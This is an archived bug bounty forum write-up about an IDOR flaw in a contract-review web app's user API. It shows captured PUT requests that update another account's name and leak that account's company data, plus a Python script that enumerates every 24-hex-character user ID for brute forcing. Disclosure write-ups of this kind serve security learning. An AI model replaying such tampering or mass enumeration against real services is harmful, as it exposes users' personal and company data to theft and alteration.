---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-02-07_alternative-link.md
original_filename: 2020-02-07_alternative-link.md
title: Alternative link
category: documents
detected_topics:
- oauth
- idor
- access-control
- command-injection
- otp
- rate-limit
tags:
- imported
- documents
- oauth
- idor
- access-control
- command-injection
- otp
- rate-limit
language: en
raw_sha256: 8202eb0dfc49e1736fe2fc846fc7ef2d3b7e9c8226ad6a7c5898e72fe48b2c0e
text_sha256: 487e97d5750c1b1433619c904672573b8ee710423cffe0ebc4850aa532455c40
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: true
---

# Alternative link

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-02-07_alternative-link.md
- Source Type: markdown
- Detected Topics: oauth, idor, access-control, command-injection, otp, rate-limit
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: True
- Raw SHA256: `8202eb0dfc49e1736fe2fc846fc7ef2d3b7e9c8226ad6a7c5898e72fe48b2c0e`
- Text SHA256: `487e97d5750c1b1433619c904672573b8ee710423cffe0ebc4850aa532455c40`


## Content

---
title: "Alternative link"
page_title: "IDOR leads to Data leakage and Profile Update - Bug Bounty - 0x00sec - The Home of the Hacker"
url: "https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025"
final_url: "https://archive.0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025"
authors: ["vict0ni (@vict0ni)"]
bugs: ["IDOR", "Bruteforce"]
publication_date: "2020-02-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4781
---

#  [IDOR leads to Data leakage and Profile Update](19025.html)

[ Bug Bounty ](../../c/bug-bounty/108.html)

[vict0ni](../../u/vict0ni.html) February 7, 2020, 5:37pm  1

In another bug bounty session of mine, I came across a bounty program of a “Contract Review” company.

In their web app, one could register with a first/last name, an email and their company’s name (and a password ofc).

Upon trying to figure out how the web app works, I updated my profile by changing my first name from “vict0ni” to “vict0ni1337”. I captured the request:
  
  
  OPTIONS /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
  Host: clientapi.website.com
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
  Accept: */*
  Accept-Language: en,en-US;q=0.7,de;q=0.3
  Accept-Encoding: gzip, deflate
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: authorization,content-type
  Origin: https://app.website.com
  Connection: close
  

followed by:
  
  
  PUT /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
  Host: clientapi.website.com
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: en,en-US;q=0.7,de;q=0.3
  Accept-Encoding: gzip, deflate
  Content-Type: application/json; charset=utf-8
  Authorization: Bearer ***REDACTED***
  Content-Length: 188
  Origin: https://app.website.com
  Connection: close
  
  {"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"[[email protected]](../../cdn-cgi/l/email-protection.html)","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
  

resulting to this response:
  
  
  HTTP/1.1 200 OK
  Date: Thu, 06 Feb 2020 13:43:35 GMT
  Content-Type: application/json; charset=utf-8
  Content-Length: 948
  Connection: close
  Set-Cookie: __cfduid=db2571d1ac9e83a96ca3265b9a0bf1d4c1580996613; expires=Sat, 07-Mar-20 13:43:33 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
  Access-Control-Allow-Origin: https://app.website.com
  ETag: W/"3b4-QbbUm9x0qtqg3/Bqcixd7mbQgqw"
  Vary: Origin, Accept-Encoding
  CF-Cache-Status: DYNAMIC
  Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
  Server: cloudflare
  CF-RAY: 560d8dc0581c4098-HAM
  
  {"users":[{"contracts":[],"createdAt":1580425135972,"updatedAt":1580996613958,"id":"5e335fafedd93a1f35b6ca27","email":"[[email protected]](../../cdn-cgi/l/email-protection.html)","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"3measgw3gr1yjpgvddqn","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e335faeedd93a1f35b6ca26"}],"companies":[{"createdAt":1580425133542,"updatedAt":1580428552059,"id":"5e335faeedd93a1f35b6ca26","name":"BugBounty","seq":5119,"vatId":"","phone":"1337","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"zqpwr","referralExtraCredits":0,"subscription":{"id":"16A1DGRp7Up0s1Qu7","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e335faeedd93a1f35b6ca26/users","contracts":"/companies/5e335faeedd93a1f35b6ca26/contracts"}}]}
  

So I was making an OPTIONS request and then a PUT request with my personal userID `5e335fafedd93a1f35b6ca27` updating my first name (one could only change the first and last name) and responding back with a 200 HTTP response and a bunch of info about my account and my company.

I always make two accounts when testing a web app. I did the same thing for my second account, just to grab its userID. Then I thought what could happen if I used the userID of account B in a request to update the account A. So I did the exact same thing as described above, being authorized as a user of account A, but using the userID of account B:
  
  
  PUT /users/5e3c8692f3d2c616c6ed78e9 HTTP/1.1
  Host: clientapi.website.com
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: en,en-US;q=0.7,de;q=0.3
  Accept-Encoding: gzip, deflate
  Content-Type: application/json; charset=utf-8
  Authorization: Bearer ***REDACTED***
  Content-Length: 188
  Origin: https://app.website.com
  Connection: close
  
  {"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"[[email protected]](../../cdn-cgi/l/email-protection.html)","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
  

resulting to this response:
  
  
  HTTP/1.1 200 OK
  Date: Thu, 06 Feb 2020 21:38:07 GMT
  Content-Type: application/json; charset=utf-8
  Content-Length: 943
  Connection: close
  Set-Cookie: __cfduid=d78cefde78c34008ca49d162306b8fcfb1581025085; expires=Sat, 07-Mar-20 21:38:05 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
  Access-Control-Allow-Origin: https://app.website.com
  ETag: W/"3af-ctJNYxOVotnOZ8DYR4ejpainHVE"
  Vary: Origin, Accept-Encoding
  CF-Cache-Status: DYNAMIC
  Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
  Server: cloudflare
  CF-RAY: 561044dd2b4fcd93-CDG
  
  {"users":[{"contracts":[],"createdAt":1581024914019,"updatedAt":1581025085895,"id":"5e3c8692f3d2c616c6ad78e9","email":"[[email protected]](../../cdn-cgi/l/email-protection.html)","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"5pjs1pjjwprphpkce0rj","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e3c8690f3d2c616c6ed78e8"}],"companies":[{"createdAt":1581024911551,"updatedAt":1581024919638,"id":"5e3c8690f3d2c616c6ed78e8","name":"CompanyB","seq":5137,"vatId":"dummyVATID","phone":"1234567890","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"plozx","referralExtraCredits":0,"subscription":{"id":"16BcmbRpl5Qvt1Lwv","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e3c8690f3d2c616c6ed78e8/users","contracts":"/companies/5e3c8690f3d2c616c6ed78e8/contracts"}}]}
  

So, by changing the userID to the account B’s userID, I could update the account B’s first and last name, grab it’s mail, referral code, companyID, subscription plan, number of employees, phone number, the company’s [VAT identification number](../../../external.html?link=https://en.wikipedia.org/wiki/VAT_identification_number) etc., while being authorized as account A. With the referral code, a user could use it to gain $30 as a “gift” for getting referred by another user.

Probably the server did not identifiy who was sending the `Authorization` header and it was just making sure that a valid Authorization header existed.

While that’s all good, the userID of each account remains secret. There had to be some kind of MiTM attack to capture it and make a targeted attack. So I thought maybe I could generalize the attack, instead of targeting a single account.  
By using dummy userIDs, in order to test the brute-force protection, I found out that the endpoint was vulnerable to brute-force attacks. Since the userID is following a certain pattern (a string of 24 hex characters), one could generate all the possible IDs and save them into a file with this python script:
  
  
  import itertools
  
  string = '0123456789abcdef'
  file = open('userIDs.txt', 'w')
  for p in itertools.product(string, repeat=24):
  writing = ''.join(p) + '\n'
  file.write(writing)
  file.close()
  

With enough computing power, an attacker could change the first/last name of all users and grab their account and company info.

Thanks for reading!

13 Likes

[Prom3DNS](../../u/Prom3DNS.html) February 7, 2020, 11:50pm  2

Really cool Write-Up! ![:slight_smile:](../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9)

1 Like

[device](../../u/device.html) February 14, 2020, 10:43am  3

Wow, this was great, thanks for sharing!

1 Like
